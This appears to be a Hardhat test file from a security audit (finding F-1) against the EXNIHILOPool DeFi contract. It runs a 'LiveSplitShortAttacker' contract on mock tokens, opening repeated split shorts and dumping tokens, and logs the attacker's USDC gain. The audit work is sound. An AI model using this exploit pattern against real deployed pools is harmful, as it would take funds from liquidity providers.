import { expect } from "chai";
import { ethers } from "hardhat";
import { time } from "@nomicfoundation/hardhat-network-helpers";

// Audit R4 PoC against the deployed tree (5197494). Run from a worktree at that commit:
// copy this into packages/blockchain/test/ and LiveSplitShortAttacker.sol into contracts/test/.

const USDC = 10n ** 6n;
const TOKEN = 10n ** 18n;
const fmt = (v: bigint) => ethers.formatUnits(v, 6);

async function market(maxUsd: bigint, maxBps: bigint) {
  const signers = await ethers.getSigners();
  const [, treasury, creator, eoa] = signers;
  const M = await ethers.getContractFactory("MockERC20");
  const usdc = await M.deploy("USD Coin", "USDC", 6);
  const token = await M.deploy("Base", "BASE", 18);
  const positionNFT = await (await ethers.getContractFactory("PositionNFT")).deploy();
  const sys = signers[8];
  const poolDeployer = await (await ethers.getContractFactory("PoolDeployer")).connect(sys).deploy();
  const predicted = ethers.getCreateAddress({ from: sys.address, nonce: await sys.getNonce() });
  const lpNft = await (await ethers.getContractFactory("LpNFT")).deploy(predicted);
  const factory = await (await ethers.getContractFactory("EXNIHILOFactory")).connect(sys).deploy(
    await positionNFT.getAddress(), await lpNft.getAddress(), await usdc.getAddress(),
    treasury.address, 100, await poolDeployer.getAddress());
  await positionNFT.initFactory(await factory.getAddress());
  await usdc.mint(creator.address, 100_000n * USDC);
  await token.mint(creator.address, 100_000n * TOKEN);
  await usdc.connect(creator).approve(await factory.getAddress(), ethers.MaxUint256);
  await token.connect(creator).approve(await factory.getAddress(), ethers.MaxUint256);
  const rc = await (await factory.connect(creator).createMarket(
    await token.getAddress(), 100_000n * USDC, 100_000n * TOKEN, maxUsd, maxBps, 30 * 24 * 3600)).wait();
  let addr = "";
  for (const l of rc!.logs) {
    try { const p = factory.interface.parseLog(l); if (p?.name === "MarketCreated") addr = p.args[0]; } catch {}
  }
  const pool = await ethers.getContractAt("EXNIHILOPool", addr);
  await time.increase(3600);
  const att = await (await ethers.getContractFactory("LiveSplitShortAttacker")).connect(eoa)
    .deploy(addr, await usdc.getAddress(), await token.getAddress());
  return { pool, usdc, token, att };
}

describe("Audit R4 — F-1 on the deployed contracts (5197494)", function () {
  this.timeout(600_000);

  for (const [k, perBps, dumpPct, capBps] of [
    [1n, 1250n, 55n, 0n], [4n, 500n, 95n, 0n], [16n, 140n, 105n, 0n], [32n, 70n, 105n, 0n], [32n, 70n, 105n, 2000n],
  ] as const) {
    it(`k=${k} shorts of ${perBps} bps, dump ${dumpPct} %, cap ${capBps} bps`, async function () {
      const { pool, usdc, token, att } = await market(0n, capBps);
      const a = await att.getAddress();
      await usdc.mint(a, 100_000n * USDC);
      const dump = (100_000n * TOKEN * dumpPct) / 100n;
      await token.mint(a, dump);
      const u0 = await usdc.balanceOf(a), t0 = await token.balanceOf(a);
      const y0 = await pool.backedAirUsd();
      await att.attack((100_000n * USDC * perBps) / 10_000n, k, dump);
      const gain = (await usdc.balanceOf(a)) - u0;
      console.log(`      attacker ${gain >= 0n ? "+" : ""}$${fmt(gain)}, token delta ${(await token.balanceOf(a)) - t0}, ` +
        `LP backed USDC ${fmt((await pool.backedAirUsd()) - y0)}`);
      expect((await token.balanceOf(a)) - t0).to.be.gte(0n);
    });
  }

  it("chunked: 32 shorts of 125 bps, dump 7.8x in 20 swaps", async function () {
    const { pool, usdc, token, att } = await market(0n, 0n);
    const a = await att.getAddress();
    const dump = (100_000n * TOKEN * 78n) / 10n;
    await usdc.mint(a, 1_000_000n * USDC);
    await token.mint(a, dump);
    const u0 = await usdc.balanceOf(a), t0 = await token.balanceOf(a);
    await att.attackChunked((100_000n * USDC * 125n) / 10_000n, 32n, dump, 20n);
    const gain = (await usdc.balanceOf(a)) - u0;
    console.log(`      attacker +$${fmt(gain)}, token delta ${ethers.formatEther((await token.balanceOf(a)) - t0)}`);
    expect((await token.balanceOf(a)) - t0).to.be.gte(0n);
    void pool;
  });
});
